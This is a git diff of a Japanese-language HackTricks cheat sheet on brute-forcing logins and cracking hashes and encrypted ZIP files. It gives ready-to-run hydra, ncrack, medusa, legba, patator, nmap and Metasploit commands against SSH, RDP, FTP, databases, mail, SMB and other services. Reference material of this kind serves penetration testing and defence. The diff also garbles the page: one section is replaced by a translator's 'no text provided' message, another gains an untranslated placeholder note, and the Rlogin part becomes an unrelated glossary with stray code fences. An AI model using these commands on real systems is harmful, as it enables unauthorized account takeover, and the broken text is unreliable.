@@ -1,28 +1,30 @@
 # ブルートフォース - チートシート
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で**最も進んだ**コミュニティツールによって動力を得た**ワークフローを簡単に構築し、自動化**します。\
+世界で**最も進んだ**コミュニティツールを駆使して、簡単に**ワークフローを構築**し**自動化**するために[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用します。\
 今すぐアクセス：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>
 
-* **サイバーセキュリティ会社**で働いていますか？ **HackTricksに広告を掲載**したいですか？または、**PEASSの最新バージョンにアクセス**したり、**HackTricksをPDFでダウンロード**したいですか？ [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをご覧ください。
-* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングのコツを共有するために、** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) と [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**
+HackTricksをサポートする他の方法：
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**PEASSファミリー**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。
 
 </details>
 
-## デフォルトの資格情報
+## デフォルトクレデンシャル
 
-使用されている技術のデフォルトの資格情報について**Googleで検索**するか、**これらのリンクを試してみてください**：
+使用されている技術のデフォルトクレデンシャルについて**Googleで検索**するか、**これらのリンクを試してみてください**：
 
 * [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 * [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -64,7 +66,7 @@ python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-特定の単語セットを提供することで、与えられた単語から多くのバリエーションを作成し、特定のターゲットに関して使用するためのユニークで理想的なワードリストを作成することができるワードリストジェネレーターツールです。
+特定の単語セットを提供することで、与えられた単語から多くのバリエーションを作成し、特定のターゲットに関して使用するためのユニークで理想的なワードリストを作成することができるワードリストジェネレータツールです。
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -98,7 +100,7 @@ Finished in 0.920s.
 * [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 * [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で**最も進んだ**コミュニティツールによって動力を供給される**ワークフローを簡単に構築し自動化**します。\
@@ -148,30 +150,6 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/word
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
 ```
 ### FTP
-
-FTP (File Transfer Protocol) は、ファイルをネットワーク経由で転送するための標準的なプロトコルです。FTP サーバーへのアクセスには通常、ユーザー名とパスワードが必要です。ブルートフォース攻撃は、正しい認証情報を見つけるために、多数のユーザー名とパスワードの組み合わせを試みます。
-
-#### ツール
-
-- `hydra`
-- `ncrack`
-- `medusa`
-
-これらのツールは、FTP サーバーに対するブルートフォース攻撃を実行するために使用されます。それぞれ異なる機能とオプションを提供し、攻撃のニーズに応じて選択することができます。
-
-#### メソッド
-
-1. ユーザー名リストとパスワードリストを準備します。
-2. ツールを使用して、リスト内の各組み合わせをFTPサーバーに対して試みます。
-3. 成功した認証情報を記録します。
-
-#### 対策
-
-- 強力なパスワードポリシーの実施
-- アカウントロックアウトメカニズムの使用
-- 二要素認証の導入
-
-これらの対策は、ブルートフォース攻撃に対するFTPサーバーの脆弱性を減らすのに役立ちます。
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ftp
 ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
@@ -200,7 +178,7 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordl
 # Use https-post-form mode for https
 ```
 ```
-https**に変更するには、"http-post-form"から"**https-post-form"**に変更する必要があります
+httpsの場合は、"http-post-form"から"**https-post-form**"に変更する必要があります
 
 ### **HTTP - CMS --** (W)ordpress、(J)oomla、(D)rupal、または(M)oodle
 ```
@@ -208,7 +186,7 @@ https**に変更するには、"http-post-form"から"**https-post-form"**に変
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
 ```
-### IMAP (インターネット・メッセージ・アクセス・プロトコル)
+### IMAP
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
@@ -264,44 +242,11 @@ legba mongodb --target localhost:27017 --username root --password data/passwords
 ```
 ### MSSQL
 
-MSSQLには、以下のようなブルートフォース攻撃が存在します:
-
-- **辞書攻撃**: 事前に収集した単語リストを使用してパスワードを推測します。
-- **組み合わせ攻撃**: 文字の組み合わせを試してパスワードを見つけます。
-- **ハイブリッド攻撃**: 辞書攻撃と組み合わせ攻撃の要素を組み合わせたものです。
-
-ブルートフォース攻撃を行う際には、以下のツールが有用です:
-
-- `Hydra`
-- `Medusa`
-- `Ncrack`
-
-これらのツールは、MSSQLサーバーに対するブルートフォース攻撃を自動化するのに役立ちます。また、`hashcat`や`John the Ripper`のようなツールを使用して、リークしたハッシュからパスワードを回復することも可能です。
-
-ブルートフォース攻撃は、適切な対策が施されていない場合に有効ですが、アカウントロックアウトポリシーなどのセキュリティ対策によって防がれることが多いです。そのため、攻撃前にターゲットのセキュリティポリシーを理解することが重要です。
+MSSQLに関する翻訳が必要なテキストが提供されていないため、翻訳を行うことができません。もしMSSQLに関する具体的なテキストがあれば、それを翻訳することが可能です。
 ```bash
 legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
 ```
 ### MySQL
-
-MySQLは、世界で最も広く使用されているリレーショナルデータベース管理システムの一つです。MySQLサーバーへのアクセスを取得するために、ブルートフォース攻撃がしばしば試みられます。以下は、MySQLサーバーに対するブルートフォース攻撃を行うための一般的な方法です。
-
-#### ツールとリソース
-
-- **Hydra**: 強力なログインクラッカーで、多くのプロトコルをサポートしています。
-- **Medusa**: Hydraに似ていますが、異なるオプションと機能を持っています。
-- **Ncrack**: ネットワーク認証クラッカーで、高速かつ柔軟性があります。
-- **Patator**: HydraやMedusaに代わるマルチスレッドツールです。
-
-これらのツールは、ユーザー名とパスワードのリストを使用して、MySQLサーバーに対するブルートフォース攻撃を自動化することができます。また、クラウドベースのサービスやSaaSプラットフォームを利用して、攻撃をスケールアップすることも可能です。
-
-#### ブルートフォース攻撃の実行
-
-1. ユーザー名とパスワードのリストを準備します。これらはオンラインで見つけることができるか、以前のリークから得られることがあります。
-2. 選択したツールを使用して、リストに基づいて攻撃を開始します。
-3. 成功した認証情報を記録し、さらなるペネトレーションテストのために使用します。
-
-ブルートフォース攻撃は、適切な対策が施されていない場合には効果的ですが、アカウントロックアウトポリシーや遅延応答などのセキュリティ対策によって防がれることがあります。常に合法的な目的でのみこれらの技術を使用し、許可なくシステムにアクセスしないようにしてください。
 ```bash
 # hydra
 hydra -L usernames.txt -P pass.txt <IP> mysql
@@ -348,6 +293,8 @@ pip3 install cx_Oracle --upgrade
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
 ### POP
+
+(Translation not required for the given text.)
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
@@ -360,28 +307,49 @@ legba pop3 --username admin@example.com --password wordlists/passwords.txt --tar
 ```
 ### PostgreSQL
 
-PostgreSQLは、世界で最も進んだオープンソースのリレーショナルデータベースシステムの一つです。多くの企業や組織がデータ管理にPostgreSQLを使用しています。そのため、PostgreSQLサーバーへのアクセスを取得することは、攻撃者にとって価値のある目標となり得ます。
+PostgreSQLは、オープンソースのオブジェクトリレーショナルデータベースシステムです。強力な機能と拡張性を備えており、多くの企業やプロジェクトで使用されています。ブルートフォース攻撃を行う際には、以下のツールや手法が有効です。
 
-#### Brute-force Attack
+#### Hydra
 
-Brute-force攻撃は、あらゆる可能な組み合わせを試して正しい認証情報を見つけ出す方法です。PostgreSQLに対するBrute-force攻撃を行う際には、以下のツールが有効です。
+Hydraは、多くのプロトコルに対応した高速なパスワードクラッキングツールです。PostgreSQLの認証をブルートフォースするには、次のコマンドを使用します。
 
-- `Hydra`
-- `Ncrack`
-- `Medusa`
+```shell
+hydra -l <username> -P <password list> <ip address> postgres
+```
 
-これらのツールは、ユーザー名とパスワードのリストを使用して、総当たり攻撃を行います。攻撃が成功すれば、攻撃者はデータベースにアクセスし、機密情報を抽出したり、システムに対するさらなる攻撃を行うことができます。
+このコマンドは、指定されたユーザー名とパスワードリストを使用して、IPアドレスに対してPostgreSQLの認証を試みます。
 
-#### Defense Mechanisms
+#### Ncrack
 
-PostgreSQLサーバーを保護するためには、以下の防御メカニズムを実装することが重要です。
+Ncrackは、ネットワーク認証クラッキングに特化したツールです。以下のコマンドでPostgreSQLの認証をブルートフォースできます。
 
-- 強力なパスワードポリシーの採用
-- アカウントロックアウト機能の有効化
-- 認証試行の監視とアラートの設定
-- ネットワークレベルでのアクセス制御
+```shell
+ncrack -p 5432 --user <username> --pass <password list> <ip address>
+```
 
-これらの対策により、Brute-force攻撃のリスクを軽減し、PostgreSQLサーバーのセキュリティを向上させることができます。
+このコマンドは、指定されたポート、ユーザー名、パスワードリストを使用して、IPアドレス上のPostgreSQLサービスに対する認証を試みます。
+
+#### Medusa
+
+Medusaは、Hydraに似たパスワードクラッキングツールですが、異なるアプローチを採用しています。PostgreSQLに対するブルートフォース攻撃の例は以下の通りです。
+
+```shell
+medusa -h <ip address> -u <username> -P <password list> -M postgres
+```
+
+このコマンドは、指定されたIPアドレス、ユーザー名、パスワードリストを使用して、PostgreSQLサービスの認証をブルートフォースします。
+
+#### Patator
+
+Patatorは、HydraやMedusaと同様に、多くのサービスに対するブルートフォース攻撃を行うことができるツールです。PostgreSQLに対するコマンドは以下のようになります。
+
+```shell
+patator pgsql_login host=<ip address> user=<username> password=FILE0 0=<password list>
+```
+
+このコマンドは、指定されたIPアドレス、ユーザー名、パスワードリストを使用して、PostgreSQLの認証をブルートフォースします。
+
+これらのツールを使用する際は、対象システムに許可を得ていることを確認し、違法な行為を行わないようにしてください。また、ブルートフォース攻撃は対象システムに大きな負荷をかける可能性があるため、注意が必要です。
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
 medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
@@ -398,7 +366,36 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
 ```
-### RDP (リモートデスクトッププロトコル)
+### RDP
+
+RDP (Remote Desktop Protocol) は、Windows システムでリモートデスクトップ接続を提供するためのプロトコルです。RDP セッションをブルートフォースすることは、攻撃者がネットワーク上のシステムにアクセスする一般的な方法です。以下は、RDP セッションをブルートフォースするための一般的な手法とリソースです。
+
+#### ツール
+
+- `Hydra`
+- `Ncrack`
+- `Crowbar`
+
+#### 方法
+
+1. ユーザー名のリストを収集または作成します。
+2. パスワードのリストを収集または作成します。
+3. 対象の IP アドレスまたはホスト名を特定します。
+4. 選択したツールを使用して、収集した情報をもとにブルートフォース攻撃を実行します。
+
+#### 注意点
+
+- RDP セッションのブルートフォースは、アカウントロックアウトポリシーによって阻止される可能性があります。
+- ネットワークの遅延や不安定さは、ブルートフォース攻撃の効率を低下させる可能性があります。
+- 対象のシステムに IDS/IPS がある場合、攻撃が検出されるリスクがあります。
+
+#### 防御
+
+- 強力なパスワードポリシーを実施する。
+- アカウントロックアウトポリシーを適用する。
+- IDS/IPS を使用して不正なログイン試行を検出する。
+- RDP の使用を必要なユーザーに限定する。
+- マルチファクタ認証を実装する。
 ```bash
 ncrack -vv --user <User> -P pwds.txt rdp://<IP>
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
@@ -419,27 +416,43 @@ hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 ```
 ### Rlogin
 
-Rloginは、リモートマシンへのログインを可能にするUNIXコマンドです。このコマンドは、ユーザー名とパスワードを使用して、別のUNIXシステムにアクセスするために使われます。Rloginはセキュリティが弱いため、現在はあまり使用されていませんが、古いシステムやセキュリティが疎かにされている環境では依然として見つけることができます。
+Rloginは、リモートマシンへのログインを可能にするUNIXコマンドです。このコマンドは、信頼できるホスト間でのパスワードなしのログインを許可することができます。しかし、セキュリティが弱いため、現代ではあまり使用されていません。
 
-### SSH
+### Brute Force Attack
 
-SSH（Secure Shell）は、リモートマシンへの安全なログインとコマンド実行を提供するプロトコルです。SSHは、暗号化を使用してデータを保護し、eavesdroppingやman-in-the-middle攻撃から保護します。SSHは、リモートマシンへの安全なアクセスが必要な場合に広く使用されています。
+Brute Force Attackは、あらゆる可能な組み合わせを試して正しい情報を見つけ出す攻撃方法です。パスワード、PINコード、暗号キーなどが対象となります。この攻撃は時間がかかるため、効率的な攻撃手法ではありませんが、セキュリティが低いシステムでは有効です。
 
-### Telnet
+### Dictionary Attack
 
-Telnetは、リモートコンピュータに対して仮想端末サービスを提供するプロトコルです。しかし、Telnetはデータを暗号化せずに送信するため、機密情報が盗聴されるリスクがあります。そのため、セキュリティが重要な環境ではSSHに置き換えられることが多いです。
+Dictionary Attackは、事前に収集した単語リスト（辞書）を使用してパスワードを推測する攻撃方法です。Brute Force Attackよりも高速ですが、辞書にないパスワードは見つけられません。
 
-### FTP
+### Hybrid Attack
 
-FTP（File Transfer Protocol）は、ネットワークを介してファイルを転送するための標準的なプロトコルです。FTPは、ユーザー名とパスワードを使用して認証を行いますが、データは暗号化されずに転送されるため、セキュリティ上の問題があります。FTPの代わりに、SFTP（SSH File Transfer Protocol）やFTPS（FTP Secure）などの安全な代替手段が推奨されます。
+Hybrid Attackは、Brute Force AttackとDictionary Attackの組み合わせです。辞書に基づいた推測に加えて、数字や記号を追加してパスワードを見つけ出します。
 
-### HTTP Basic Authentication
+### Rainbow Table Attack
 
-HTTP Basic Authenticationは、ウェブサーバへのアクセスを制御するためのシンプルな認証メカニズムです。ユーザー名とパスワードはBase64でエンコードされて送信されますが、これは暗号化ではなく、簡単にデコードされる可能性があります。より安全な認証方法として、HTTPSを使用することが推奨されます。
+Rainbow Table Attackは、事前に計算されたハッシュ値のテーブルを使用してパスワードを解読する攻撃方法です。この攻撃は効率的ですが、ソルト（ランダムなデータ）が使用されている場合は無効です。
 
-### SNMP
+### Credential Stuffing
 
-SNMP（Simple Network Management Protocol）は、ネットワークデバイスを管理し、監視するためのプロトコルです。SNMPはバージョンによってセキュリティレベルが異なり、特に古いバージョン（SNMPv1とSNMPv2）はセキュリティが弱いため、攻撃者による悪用が可能です。SNMPv3はセキュリティが強化されていますが、設定が複雑であるため、正しく設定されていない場合があります。
+Credential Stuffingは、既知のユーザー名とパスワードの組み合わせを使用して、複数のウェブサイトやサービスにアクセスを試みる攻撃方法です。リストは、データleakや他の攻撃から得られます。
+
+### Password Spraying
+
+Password Sprayingは、多くのユーザー名に対して、一般的なパスワードを使用してログインを試みる攻撃方法です。アカウントロックアウトポリシーを回避するために、攻撃は低速で行われます。
+
+### Account Lockout
+
+Account Lockoutは、セキュリティ機能の一つで、連続したログイン失敗後にアカウントを一時的にロックします。これにより、Brute Force AttackやPassword Sprayingのような攻撃を防ぐことができます。
+
+### Two-Factor Authentication (2FA)
+
+Two-Factor Authentication (2FA)は、セキュリティを強化するために、パスワードに加えて別の認証要素を要求するシステムです。例えば、SMSで送られるコードや、認証アプリによるトークンなどがあります。
+
+### Multi-Factor Authentication (MFA)
+
+Multi-Factor Authentication (MFA)は、2FAよりも多くの認証要素を使用するセキュリティシステムです。これにより、アカウントへの不正アクセスをさらに困難にします。
 ```bash
 hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```
@@ -447,11 +460,9 @@ hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
-```
-[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)
-
 ### Rsync
-```
+
+[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)
 ```bash
 nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
 ```
@@ -466,8 +477,6 @@ legba sftp --username admin --password wordlists/passwords.txt --target localhos
 legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
 ### SNMP
-
-(SNMPの日本語訳は不要です)
 ```bash
 msf> use auxiliary/scanner/snmp/snmp_login
 nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
@@ -475,35 +484,29 @@ onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.
 hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
 ```
 ### SMB
-
-SMB (Server Message Block) は、ファイル共有、プリンタ共有、およびその他のネットワーク上のサービスへのアクセスを提供するプロトコルです。SMBを対象としたブルートフォース攻撃は、ネットワーク上の共有リソースへの不正アクセスを試みることを意味します。この攻撃は、ユーザー名とパスワードの組み合わせを繰り返し試すことによって行われます。
-
-#### ツール
-
-- `Hydra`
-- `CrackMapExec`
-- `Metasploit Framework`
-
-#### 方法
-
-1. ユーザー名のリストを収集する。
-2. パスワードのリストを収集する。
-3. ツールを使用して、収集したユーザー名とパスワードの組み合わせでログインを試みる。
-
-#### 対策
-
-- 強力なパスワードポリシーの実施
-- アカウントロックアウトポリシーの適用
-- 不要なSMBサービスの無効化
-- ネットワークセグメンテーションとアクセス制御
-
-SMBブルートフォース攻撃は、適切なセキュリティ対策が施されていない場合、成功する可能性があります。したがって、上記の対策を適切に実施することが重要です。
 ```bash
 nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
 ```
 ### SMTP
+
+SMTP (Simple Mail Transfer Protocol) は、電子メールを送信するためのプロトコルです。SMTP サーバーの認証情報が漏洩した場合、攻撃者はそのサーバーを利用してスパムメールを送信したり、フィッシング攻撃を行うことができます。SMTP サーバーへのアクセスを得るために、攻撃者はブルートフォース攻撃を使用することがあります。
+
+ブルートフォース攻撃は、あらゆる可能な組み合わせを試して正しい認証情報を見つけ出す方法です。この攻撃は時間がかかり、サーバーに負荷をかけるため、多くの場合、アカウントロックアウトポリシーや遅延応答などのセキュリティ対策によって防がれます。
+
+#### ツールとリソース
+
+- **Hydra**: 強力なブルートフォースツールで、多くのプロトコルに対応しています。
+- **CrackMapExec**: ネットワーク上の機器に対するペネトレーションテストを行うためのスイスアーミーナイフツールです。
+- **Metasploit**: ペネトレーションテストフレームワークで、SMTP サーバーのブルートフォース攻撃モジュールを含んでいます。
+
+#### 防御戦略
+
+- **強力なパスワードポリシー**: 複雑で予測不可能なパスワードを使用することで、ブルートフォース攻撃を困難にします。
+- **アカウントロックアウト**: 一定回数の失敗したログイン試行後にアカウントをロックすることで、攻撃者が無限に試行するのを防ぎます。
+- **二要素認証 (2FA)**: パスワードとは別の認証手段を追加することで、セキュリティを強化します。
+- **レートリミット**: ログイン試行の速度を制限することで、ブルートフォース攻撃を遅らせます。
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
@@ -527,32 +530,31 @@ msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts
 ```
 ### SSH
 
-SSH (Secure Shell) は、ネットワーク上での安全なデータ通信、リモートコマンドラインログイン、リモートコマンド実行などを可能にするプロトコルです。SSH brute-force 攻撃は、SSH サービスに対して、多数のユーザー名とパスワードの組み合わせを繰り返し試すことによって、認証情報を推測しようとする攻撃手法です。
+SSH (Secure Shell) は、ネットワーク上での安全なデータ通信、リモートコマンドラインログイン、リモートコマンド実行などを可能にするプロトコルです。SSH接続をブルートフォース攻撃することは、攻撃者が無制限にパスワードを試すことを可能にします。これは、弱いパスワードやデフォルトのパスワードを使用しているアカウントを特定するために使用されます。
 
 #### ツール
 
 - `Hydra`
-- `Ncrack`
 - `Medusa`
+- `Ncrack`
 
-これらのツールは、SSH サービスに対する brute-force 攻撃を行うために使用されます。それぞれのツールは、異なる機能と利点を持っていますが、基本的な使用方法は似ています。
+これらのツールは、SSHサーバーに対するブルートフォース攻撃を自動化するために使用されます。それぞれが異なる機能と効率性を持っていますが、基本的な使用法は似ています。
 
 #### メソッド
 
-1. 対象の SSH サービスを特定します。
-2. ユーザー名のリストを用意します。これは、既知のユーザー名、一般的なユーザー名、または leak されたデータから取得したユーザー名を含むことができます。
-3. パスワードのリストを用意します。これは、一般的なパスワード、カスタムワードリスト、または leak されたデータから取得したパスワードを含むことができます。
-4. 選択したツールを使用して、ユーザー名とパスワードの組み合わせを試します。
-5. 成功した認証情報を記録します。
+1. 対象のSSHサーバーのIPアドレスまたはホスト名を特定します。
+2. 使用するツールを選択し、攻撃を実行するためのオプションを設定します。
+3. ユーザー名のリストとパスワードのリストを準備します。
+4. ツールを使用して攻撃を開始し、成功した認証を監視します。
 
-#### 防御
+#### 対策
 
-- 強力なパスワードポリシーを実施する。
-- 二要素認証を使用する。
-- SSH キー認証を使用する。
-- アクセス試行の制限を設定する（例：fail2ban）。
+- 強力なパスワードポリシーの実施
+- パスワード認証の代わりに公開鍵認証の使用
+- 失敗したログイン試行に対する制限の設定
+- SSHサービスのポート番号をデフォルトの22から変更する
 
-これらの防御策は、SSH brute-force 攻撃に対するセキュリティを強化するために有効です。
+これらの対策は、SSHサーバーに対するブルートフォース攻撃のリスクを減らすのに役立ちます。
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ssh
 ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
@@ -562,13 +564,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### Weak SSH keys / Debian predictable PRNG
+#### 弱いSSHキー / Debian予測可能なPRNG
 
-いくつかのシステムでは、暗号素材を生成するために使用されるランダムシードに既知の欠陥があります。これにより、キースペースが劇的に減少し、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)のようなツールでブルートフォース攻撃が可能になる場合があります。また、[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)のように、事前に生成された弱いキーのセットも利用可能です。
+一部のシステムでは、暗号素材を生成するために使用されるランダムシードに既知の欠陥があります。これにより、キースペースが劇的に減少し、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)のようなツールでブルートフォース攻撃が可能になる場合があります。弱いキーの事前生成セットも、[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)のように利用可能です。
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ, OpenMQ)
 
-STOMPテキストプロトコルを使用すると、ActiveMQ、RabbitMQ、HornetQ、OpenMQのようなメッセージキューイングサービスとのやり取りが可能です。
+STOMPテキストプロトコルは、ActiveMQ、RabbitMQ、HornetQ、OpenMQのようなメッセージキューイングサービスとのやり取りを可能にします。
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -606,10 +608,11 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+```markdown
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で**最も高度な**コミュニティツールを駆使した**ワークフローを簡単に構築し、自動化**します。\
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で**最も高度な**コミュニティツールを搭載した**ワークフローを簡単に構築し、自動化**します。
 今すぐアクセス：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -619,11 +622,11 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ### オンラインクラッキングデータベース
 
 * [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
+* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP および任意のチャレンジ値)
 * [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (ハッシュ、WPA2キャプチャ、MSOffice、ZIP、PDFのアーカイブなど)
 * [https://crackstation.net/](https://crackstation.net) (ハッシュ)
 * [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-* [https://gpuhash.me/](https://gpuhash.me) (ハッシュとファイルハッシュ)
+* [https://gpuhash.me/](https://gpuhash.me) (ハッシュおよびファイルハッシュ)
 * [https://hashes.org/search.php](https://hashes.org/search.php) (ハッシュ)
 * [https://www.cmd5.org/](https://www.cmd5.org) (ハッシュ)
 * [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
@@ -633,6 +636,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ハッシュをブルートフォースする前に、これをチェックしてください。
 
 ### ZIP
+```
 ```bash
 #sudo apt-get install fcrackzip
 fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
@@ -650,7 +654,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### 既知平文zip攻撃
 
-暗号化されたzipの**中に含まれるファイルの平文**（またはその一部）を知る必要があります。暗号化されたzipの中に含まれる**ファイル名とファイルサイズを確認する**には、次のコマンドを実行します: **`7z l encrypted.zip`**\
+暗号化されたzipの**中に含まれるファイルの** **平文**（または平文の一部）を知る必要があります。暗号化されたzipの中に含まれる**ファイル名とファイルサイズ**を確認するには、次のコマンドを実行します: **`7z l encrypted.zip`**\
 リリースページから[**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)をダウンロードしてください。
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
